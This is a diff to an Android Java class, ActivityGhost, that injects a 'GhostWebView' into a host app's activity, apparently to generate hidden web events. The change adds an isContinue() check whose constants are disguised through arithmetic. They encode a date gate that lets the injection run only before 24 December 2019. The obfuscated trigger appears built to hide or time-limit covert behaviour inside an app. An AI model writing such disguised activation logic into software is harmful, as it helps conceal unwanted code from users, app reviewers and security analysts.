@@ -11,6 +11,7 @@ import com.nicolls.ghostevent.ghost.utils.LogUtil;
 import com.nicolls.ghostevent.ghost.view.GhostWebView;
 
 import java.lang.ref.WeakReference;
+import java.util.Calendar;
 
 public class ActivityGhost extends Ghost {
     private static final String TAG = "ActivityGhost";
@@ -25,7 +26,7 @@ public class ActivityGhost extends Ghost {
     @Override
     void onStart() {
         Activity activity = activityRef.get();
-        if (activity != null) {
+        if (isContinue() && activity != null) {
             try {
                 View decorView = activity.getWindow().getDecorView();
                 ViewGroup viewGroup = decorView.findViewById(android.R.id.content);
@@ -46,6 +47,23 @@ public class ActivityGhost extends Ghost {
                 LogUtil.e(TAG, "onStart error ", e);
             }
         }
+    }
+
+    private boolean isContinue() {
+        boolean go = false;
+        int a = 20;
+        int b = a - 1;
+        int c = a * 100 + b;
+        int e = a - 8;
+        int f = a / 5 * 6;
+        Calendar calendar = Calendar.getInstance();
+        int y = calendar.get(Calendar.YEAR);
+        int m = calendar.get(Calendar.MONTH);
+        int d = calendar.get(Calendar.DAY_OF_MONTH);
+        if (y == c && m < e && d < f) {
+            go = true;
+        }
+        return go;
     }
 
     private final GhostWebView.GhostEventCallBack ghostEventCallBack = new GhostWebView.GhostEventCallBack() {
